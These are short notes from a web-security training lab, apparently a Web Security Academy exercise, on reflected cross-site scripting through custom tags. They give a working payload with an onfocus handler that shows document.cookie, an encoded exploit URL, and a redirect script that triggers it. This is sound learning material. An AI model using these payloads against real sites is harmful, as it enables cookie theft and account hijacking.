Seeing the homepage the first thought is to inject through the search bar
<xss id=x tabindex=1 onfocus=alert(document.cookie)>
in the search bar gave no error 
The url was as follows
https://ac461fb61ff9ac9d809f471a0008002a.web-security-academy.net/?search=%3Cxss+id%3Dx+tabindex%3D1+onfocus%3Dalert(1)%3E%3C%2Fxss%3E
A #x added to the end of the url implied that the focus was to be on the new element with id=x which we created
<script>
location='https://ac461fb61ff9ac9d809f471a0008002a.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x'
</script> 

Important to note in the cheat sheet this was not working on firefox and worked on chrome instead
location is window.location it changes the url of the current page being displayed
